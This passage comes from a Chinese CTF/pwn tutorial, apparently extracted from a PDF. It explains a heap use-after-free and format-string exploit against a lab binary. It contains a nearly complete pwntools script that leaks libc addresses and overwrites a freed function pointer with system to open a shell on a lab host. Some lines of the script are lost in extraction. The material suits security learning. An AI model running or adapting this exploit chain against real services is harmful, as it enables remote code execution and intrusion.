3 释放chunk1
4 释放chunk0
5 create(0x20 创建 chunk0 占位 old_chunk0,占位 old_chunk1
6 创建 chunk1 覆盖 old_chunk1->data->free 为 puts
此时执⾏delete操作，也就执⾏了。
1 free(ptr) -> puts(ptr->buffer和后⾯覆盖的puts地址)
打印出了puts_addr地址，然后通过计算偏移得到⼆进制基址,如下:
1 bin_base_addr = puts_addr - offset
然后利⽤⼆进制基址算出⼆进制⾃带的 printf 真实地址，再次利⽤格式化字符漏洞实
现任意地址读写。
如下是得到printf 真实地址 printf_addr后利⽤格式化字符漏洞实现任意地址读写的
测试过程，我们输出10个%p 也就打印了堆栈前⼏个数据值。然后找到了 arg9 为我们
能够控制的数据，所以利⽤脚本⾥printf输出参数变成了 "%9$p"，读取第九个参数。
1 delete(0)
2 payload = 'a%p%p%p%p%p%p%p%p%p%p'.ljust(0x18, '#') + p64(printf_addr)
3 create(0x20, payload)
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 30/36
2020/7/27 linux pwn⼊门学习到放弃
4 p.recvuntil("quit")
5 p.send("delete ")
6 p.recvuntil("id:")
7 p.send(str(1) + '\n')
8 p.recvuntil("?:")
9 p.send("yes.1111" + p64(addr) + "\n") # 触发 printf漏洞
10
11 p.recvuntil('a')
12 data = p.recvuntil('####')[:-4]
IDA调试时内存数据为如下:
1 0000560DFCD3C000 00 00 00 00 00 00 00 00 31 00 00 00 00 00 00 00 ....
2 0000560DFCD3C010 40 C0 D3 FC 0D 56 00 00 00 00 00 00 00 00 00 00 @...
3 0000560DFCD3C020 1E 00 00 00 00 00 00 00 6C CD 7C FB 0D 56 00 00 ....
4 0000560DFCD3C030 00 00 00 00 00 00 00 00 31 00 00 00 00 00 00 00 ....
5 0000560DFCD3C040 61 25 70 25 70 25 70 25 70 25 70 25 70 25 70 25 a%p%
6 0000560DFCD3C050 70 25 70 25 70 23 23 23 D0 C9 7C FB 0D 56 00 00 p%p%
7
8 00007FFE50BF9630 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 ....
9 00007FFE50BF9640 79 65 73 2E 31 31 31 31 00 60 8C 2B 45 56 00 00 yes.
10
11 00007FFCA59554F8 0000560DFB7CCE95 delete_sub_D95+100
12 00007FFCA5955500 0000000000000000
13 00007FFCA5955508 0000000100000000 arg7
14 00007FFCA5955510 313131312E736579 arg8
15 00007FFCA5955518 0000560DFB7CC000 LOAD:0000560DFB7CC000 # arg9 读取这个
16 00007FFCA5955520 000000000000000A
17 00007FFCA5955528 0000560DFB7CCA50 start
18 00007FFCA5955530 00007FFCA5955D90 [stack]:00007FFCA5955D90
利⽤格式化字符串漏洞实现任意地址后，读取两个libc函数然后确定libc版本,获取对应
libc版本的system_addr。
最终利⽤
1 #!/usr/bin/python
2 # -*- coding: UTF-8 -*-
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 31/36
2020/7/27 linux pwn⼊门学习到放弃
3
4 from pwn import *
5
6 context.log_level = 'debug'
7 # target = process('pwn-f')
8 p = remote('172.16.36.176', 10003)
9
10 elf = ELF("./pwn-f")
11 libc_elf = ELF("./libc-2.23.so")
12 def create(size, string):
13 p.recvuntil('3.quit')
14 p.sendline('create ')
15 p.recvuntil('size:')
16 p.sendline(str(size))
17 p.recvuntil('str:')
18 p.send(string)
19
20 def delete(id):
21 p.recvuntil('3.quit')
22 p.sendline('delete ')
23 p.recvuntil('id:')
24 p.sendline(str(id))
25 p.recvuntil('sure?:')
26 p.sendline('yes')
27
28 def leak(addr):
29 global printf_addr
30
31 delete(0)
32 payload = 'a%9$s'.ljust(0x18,'#') + p64(printf_addr) #覆盖chunk1的 f
33 create(0x20,payload)
34 p.recvuntil("quit")
35 p.send("delete ")
36 p.recvuntil("id:")
37 p.send(str(1)+'\n')
38 p.recvuntil("?:")
39 p.send("yes.1111"+p64(addr)+"\n") # 触发 printf漏洞
40 p.recvuntil('a')
41 data = p.recvuntil('####')[:-4]
42 if len(data) == 0:
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 32/36
2020/7/27 linux pwn⼊门学习到放弃
43 return '\x00'
44 if len(data)  call _puts
64
65
66 #step 3 leak base addr
67 p.recvuntil('b'*0x10)
68 data = p.recvuntil('\n')[:-1]
69 if len(data)>8:
70 data=data[:8]
71 data = u64(data.ljust(0x8,'\x00'))# leaked puts address use it to c
72 pwn_base_addr = data - 0xd2d # 减去⼆进制base
73
74 log.info("pwn_base_addr : {}".format(hex(pwn_base_addr))) # 找到了pl
75
76 # free -> printf
77 # 我们⾸先create字符串调⽤delete 此时freeshort地址变成了printf，可以控制打印
78 #step 4 get printf func addr
79 printf_plt = pwn.plt['printf']
80 printf_addr = pwn_base_addr + printf_plt #get real printf addr
81
82 log.info("printf_addr : {}".format(hex(printf_addr)))
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 33/36
2020/7/27 linux pwn⼊门学习到放弃
83
84 delete(0)
85
86 #step 5 leak system addr
87 create(0x20,payload) # 继续调⽤ free -> puts
88 delete(1) #this one can not be ignore because DynELF use the delete
89
90 # 泄露malloc_addr
91 delete(0)
92 payload = 'a%9$s'.ljust(0x18,'#') + p64(printf_addr) #覆盖chunk1的 f
93 create(0x20,payload)
94 p.recvuntil("quit")
95 p.send("delete ")
96 p.recvuntil("id:")
97 p.send(str(1)+'\n')
98 p.recvuntil("?:")
99 p.send("yes.1111"+p64(elf.got["malloc"] + pwn_base_addr)+"\n") # 触
100 p.recvuntil('a')
101 data = p.recvuntil('####')[:-4]
102
103 malloc_addr = u64(data.ljust(8,"\x00"))
104 log.info("malloc_addr : {}".format(hex(malloc_addr)))
105
106 # 泄露 puts_addr
107 delete(0)
108 payload = 'a%9$s'.ljust(0x18,'#') + p64(printf_addr) #覆盖chunk1的 f
109 create(0x20,payload)
110 p.recvuntil("quit")
111 p.send("delete ")
112 p.recvuntil("id:")
113 p.send(str(1)+'\n')
114 p.recvuntil("?:")
115 p.send("yes.1111"+p64(elf.got["puts"] + pwn_base_addr)+"\n") # 触发
116 p.recvuntil('a')
117 data = p.recvuntil('####')[:-4]
118
119 puts_addr = u64(data.ljust(8,"\x00"))
120 log.info("puts_addr : {}".format(hex(puts_addr)))
121
122 # 通过两个libc函数计算libc ,确定system_addr
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 34/36
2020/7/27 linux pwn⼊门学习到放弃
123 from LibcSearcher import *
124 obj = LibcSearcher("puts", puts_addr)
125 obj.add_condition("malloc", malloc_addr)
126 # obj.selectin_id(3)
127
128 libc_base = malloc_addr-obj.dump("malloc")
129 system_addr = obj.dump("system")+libc_base # system 偏移
130
131 log.info("system_addr : {}".format(hex(system_addr))) # 找到了plt表的
132
133 #step 6 recover old function to system then get shell
134 delete(0)
135 create(0x20,'/bin/bash;'.ljust(0x18,'#')+p64(system_addr)) # attent
136 delete(1)
137 p.interactive()
138 if __name__ == '__main__':
139 main()
总结
通过这些⼊⻔pwn知识的学习，对栈溢出,堆溢出,uaf的利⽤会有清晰的理解。对以后分
析真实利⽤场景漏洞有很⼤的帮助。利⽤脚本尽量做的通⽤，考虑多个平台。那么分析
利⽤有了，对于漏洞挖掘这⽅⾯⼜是新的⼀个课题，对于这⽅⾯的探索将另外写⽂章分
析。
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 35/36
2020/7/27 linux pwn⼊门学习到放弃
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 36/36